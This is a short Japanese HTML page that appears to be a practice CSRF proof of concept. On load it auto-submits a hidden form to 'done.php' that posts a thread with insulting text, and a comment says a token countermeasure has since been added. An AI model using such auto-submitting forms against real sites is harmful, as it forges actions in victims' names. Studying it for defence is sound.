<!DOCTYPE html>
<! csrf リンクを踏むと勝手に投稿します(tokenを仕込むことで対策済)>
<html lang="ja">
<head>
<meta charset="utf-8">
<title>ひひひひ</title>
<meta name="description">
</head>
<html>
<body onload="document.forms[0].submit()">
<form action="done.php" method="POST">
<input type="hidden" name="title" value="ばーか">
<input type="hidden" name="content" value="あーーほ">
<input type="submit" id="make_thread" name="make_thread" value="">

</form>
</body>
</html>
